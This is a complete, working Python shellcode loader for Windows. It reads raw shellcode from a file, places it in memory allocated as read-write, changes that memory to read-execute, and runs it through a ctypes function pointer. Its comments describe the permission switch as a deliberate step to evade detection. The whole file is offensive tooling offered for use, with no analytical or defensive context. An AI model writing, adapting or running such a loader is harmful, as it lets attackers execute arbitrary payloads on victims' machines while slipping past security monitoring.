import sys
import ctypes
from ctypes import wintypes

# Define necessary Windows types for 64-bit compatibility
# This ensures pointers and sizes are handled correctly.
wintypes.LPVOID = ctypes.c_void_p
wintypes.HANDLE = ctypes.c_void_p
wintypes.DWORD = ctypes.c_ulong
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.BOOL = ctypes.c_int
wintypes.SIZE_T = ctypes.c_size_t

# Define constants for memory allocation and protection
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

# Get a handle to kernel32.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define the function prototypes for the Windows APIs we will use.
# This is CRITICAL for 64-bit execution to prevent pointer truncation.

# VirtualAlloc
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAlloc.restype = wintypes.LPVOID

# VirtualProtect
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

# VirtualFree
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree
VirtualFree = kernel32.VirtualFree
VirtualFree.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD]
VirtualFree.restype = wintypes.BOOL

def main():
    """
    Reads shellcode, allocates RW memory, copies shellcode,
    changes memory protection to RX, and executes it.
    """
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_shellcode_bin>")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    
    try:
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: File not found at '{shellcode_path}'")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        sys.exit(1)

    if not shellcode:
        print("Error: Shellcode file is empty.")
        sys.exit(1)
        
    shellcode_size = len(shellcode)

    # 1. Allocate a memory buffer with PAGE_READWRITE permissions.
    # This is less suspicious than allocating RWX memory directly.
    mem_buffer = VirtualAlloc(
        None,                   # System determines address
        shellcode_size,         # Size of the allocation
        MEM_COMMIT | MEM_RESERVE, # Allocate and commit memory
        PAGE_READWRITE          # Set initial permissions to Read/Write
    )

    if not mem_buffer:
        error_code = ctypes.get_last_error()
        print(f"Failed to allocate memory. Error code: {error_code}")
        sys.exit(1)
    
    # Cast the allocated memory address to a void pointer for compatibility
    mem_buffer_ptr = ctypes.c_void_p(mem_buffer)
    print(f"Allocated {shellcode_size} bytes of RW memory at 0x{mem_buffer:016X}")

    # 2. Copy the shellcode into the allocated buffer
    ctypes.memmove(mem_buffer_ptr, shellcode, shellcode_size)
    print("Copied shellcode to memory buffer.")

    # 3. Change memory protection from RW to RX (Read/Execute)
    # This is the key evasion step.
    old_protect = wintypes.DWORD(0)
    success = VirtualProtect(
        mem_buffer_ptr,         # Address of the memory region
        shellcode_size,         # Size of the region
        PAGE_EXECUTE_READ,      # New protection constant
        ctypes.byref(old_protect) # Pointer to receive old protection
    )

    if not success:
        error_code = ctypes.get_last_error()
        print(f"Failed to change memory protection. Error code: {error_code}")
        VirtualFree(mem_buffer_ptr, 0, MEM_RELEASE)
        sys.exit(1)
    
    print(f"Changed memory protection to RX. Old protection: {hex(old_protect.value)}")

    # 4. Create a function pointer to the shellcode in memory
    shellcode_func = ctypes.CFUNCTYPE(None)(mem_buffer)

    # 5. Execute the shellcode
    print("Executing shellcode...")
    try:
        shellcode_func()
    except Exception as e:
        print(f"Shellcode execution finished or raised an exception: {e}")

    # 6. Clean up the allocated memory
    print("Releasing memory...")
    if not VirtualFree(mem_buffer_ptr, 0, MEM_RELEASE):
        error_code = ctypes.get_last_error()
        print(f"Failed to free memory. Error code: {error_code}")
    else:
        print("Memory successfully released.")

if __name__ == "__main__":
    main()